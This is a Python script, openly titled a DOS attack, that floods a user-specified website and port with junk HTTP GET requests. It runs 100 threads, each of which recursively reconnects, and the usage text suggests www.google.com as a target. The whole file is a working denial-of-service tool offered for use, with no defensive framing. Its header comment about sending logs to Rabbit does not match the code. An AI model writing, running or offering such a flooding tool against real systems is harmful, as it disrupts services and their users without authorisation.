# Author: Ekansh Grover(ekansh.grover@threat-x.com)
# Name : DOS Attack (Denial_of_service.py)
# Purpose: Sending the logs back to Rabbit while changing timestamps
# Date: 12/03/2015
# Version 1.0

import socket
import threading
import argparse

try:
    parser = argparse.ArgumentParser()
    parser.add_argument('website', help="Please give the website name e.g. www.google.com")
    parser.add_argument('port', help="Port no for the site if HTTP then 80 or if HTTPS 443")
    parser.add_argument('connections', help="Number of messages to send")
    args = parser.parse_args()
    host = args.website
    port = int(args.port)
    conn = int(args.connections)
    print("DOS ATTACK")
    message = {"!@#$%^&*()_++DOS+_)(*&^%$#@!", "87638129837981DOS12398172398", "}{hasdkhsaDOS:",
               "|?><./;[]+_(!&^%@#$%^&*(DOS)", "/", "/phpadmin", "IUHIUHIUHIUHIUHIUHIUHIUHIUHIUHIUHIUHIUHUI"}
    ip = socket.gethostbyname(host)

    def dos():
        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            ddos.connect((host, port))
            for i in message:
                message_1 = "GET " + i + " HTTP/1.1"
                message_encoded = message_1.encode(encoding='utf-8', errors='strict')
                ddos.send(message_encoded)
                ddos.sendto(message_encoded, (ip, port))
                ddos.send(message_encoded)
        except socket.error as msg:
            print("Connection Failed")
        print("Dos Attack Engaged")
        ddos.close()

        for i in range(conn):
            dos()


    threads = []
    for i in range(100):
        t = threading.Thread(target=dos)
        threads.append(t)
        t.start()
except SystemExit:
    print("Please provide the name of the website, port no. and no of connections\ne.g python senial_of_service.py www.google.com 443 10\nThreading is being used so the no of connections will be multiplied by 10")
